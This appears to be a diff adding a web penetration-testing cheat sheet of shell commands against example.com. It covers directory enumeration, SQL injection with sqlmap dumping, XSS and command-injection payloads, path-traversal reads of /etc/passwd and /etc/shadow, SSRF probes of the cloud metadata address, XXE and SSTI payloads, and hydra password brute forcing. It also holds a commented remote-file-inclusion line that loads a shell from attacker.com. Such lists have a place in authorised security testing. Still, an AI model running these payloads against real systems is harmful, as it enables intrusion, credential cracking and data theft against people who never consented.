@@ -1,0 +1,92 @@
+# Directory & File Enumeration
+for path in admin api/private restricted secret user/profile .git/config backup.tar.gz config.php.bak .env .htaccess phpinfo.php server-status backup logs debug config.bak config.php.old config.save; do curl -s -I "example.com/$path" | grep "HTTP"; done
+curl -H "Authorization: Bearer fake_token" example.com/secret
+curl -b "session=invalid" example.com/user/profile
+curl -X POST example.com/restricted
+curl -s example.com/admin > /dev/null && echo "Admin page exists"
+dirb http://example.com /usr/share/wordlists/dirb/big.txt -o dirb_results.txt
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,old -o gobuster_results.txt
+
+# Port & Service Enumeration
+nmap -p 80,443 --script http-methods,http-auth,http-security-headers,http-default-accounts,http-config-backup example.com -oN nmap_security_scan.txt
+netstat -tuln | grep -v "127.0.0.1"
+ss -tuln | grep -v "127.0.0.1"
+
+# SSL/TLS & Cryptography Testing
+testssl.sh example.com:443 > ssl_test_results.txt
+sslyze --regular example.com:443 >> ssl_test_results.txt
+nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-date -p 443 example.com -oN ssl_nmap_results.txt
+grep -r "SSLProtocol" /etc/apache2 /etc/nginx # (Local system check)
+grep -r "SSLCipherSuite" /etc/apache2 /etc/nginx # (Local system check)
+
+# Injection Attacks (SQLi, XSS, Command Injection, LFI, SSRF)
+for payload in "admin'--" "<script>alert(1)</script>" ";whoami" "1%20OR%201=1" "admin%27%20%23" "\";drop table users--"; do curl -s "example.com/search?query=$payload" | grep -i "error\|alert\|whoami"; done
+sqlmap -u "http://example.com/search?id=1" --batch --dbs --tables --dump --risk=3 --level=5 -o
+curl "http://example.com/file?path=../../../../etc/passwd"
+curl "http://example.com/api?data=`whoami`"
+nmap --script http-sql-injection,http-xss,http-phpself-xss -p 80 example.com
+
+# Internal Server Security & PHP Configuration
+grep -r -E "hardcoded_password|secret_key|api_key|mysql_connect|exec\(|system\(|password=" /var/www/html # (Local system check)
+find /var/www -type f -name "*.php" -exec grep "eval(" {} \; -print # (Local system check)
+find /var/www -type f -name "*.bak" -o -name "*.log" -o -name "*.sql" # (Local system check)
+grep -r -E "disable_functions|allow_url_fopen|allow_url_include" /etc/php* # (Local system check)
+for url in "http://localhost:8080" "http://127.0.0.1" "file:///etc/passwd" "http://169.254.169.254" "gopher://localhost:6379"; do curl -s "http://example.com/api?url=$url" | grep -i "internal\|error"; done
+
+# Authentication & Session Management Testing
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4
+curl -c cookies.txt -d "username=admin&password=test" http://example.com/login
+curl -b cookies.txt http://example.com/profile
+curl -H "Cookie: session=expired" http://example.com
+
+# Log Analysis
+tail -f /var/log/auth.log | grep "failed" # (Local system check - this is a follow-up command that might need special handling in a script)
+cat /var/log/nginx/access.log /var/log/apache2/error.log | grep -i "error\|sql\|xss" # (Local system check)
+journalctl -u sshd --since "1 hour ago" # (Local system check)
+
+# --- New Suggested Commands ---
+
+# Web Application Firewall (WAF) & Bypass Testing
+wafw00f example.com
+curl -s "http://example.com/search?query=id=1%23"
+curl -s "http://example.com/search?query=id=1%2F%2A%2A%2FOR%2F%2A%2A%2F1=1"
+
+# XML External Entity (XXE) Injection Testing
+curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' http://example.com/api/xml_endpoint
+
+# Server-Side Template Injection (SSTI) Testing
+# These Payloads may vary depending on the Template Engine
+curl -X POST -d "name={{7*7}}" http://example.com/template_page
+curl -X POST -d "name={{config.__class__.mro__}}" http://example.com/template_page
+
+# Insecure Direct Object Reference (IDOR) Testing
+# IDs must be changed based on the target URL or API structure
+curl "http://example.com/api/v1/users/123"
+curl "http://example.com/api/v1/users/1" # Example ID change
+curl -X POST -d "user_id=123&action=view_profile" http://example.com/dashboard
+
+# Subdomain Enumeration
+sublist3r -d example.com -o subdomains.txt
+assetfinder example.com > assetfinder_subs.txt
+for sub in www mail admin dev api blog staging test; do host "$sub.example.com"; done
+
+# Clickjacking Testing (Header check only)
+curl -s -I "http://example.com" | grep -i "X-Frame-Options"
+
+# Email Spoofing / DMARC / SPF / DKIM Testing (DNS Records check)
+dig txt example.com | grep -i "spf"
+dig txt _dmarc.example.com | grep -i "dmarc"
+
+# Git Repository Configuration Check
+curl "http://example.com/.git/config"
+curl "http://example.com/.git/HEAD"
+
+# More Payloads for LFI
+curl "http://example.com/page.php?file=../../../../etc/shadow"
+curl "http://example.com/page.php?file=../../../../proc/self/cmdline"
+
+# Payload for RFI (for testing on a controlled environment with an attacker server only)
+# curl "http://example.com/page.php?file=http://attacker.com/malicious_shell.txt"
+
+# Cross-Site Request Forgery (CSRF) Testing
+curl -s "http://example.com/login" | grep -i "csrf_token"
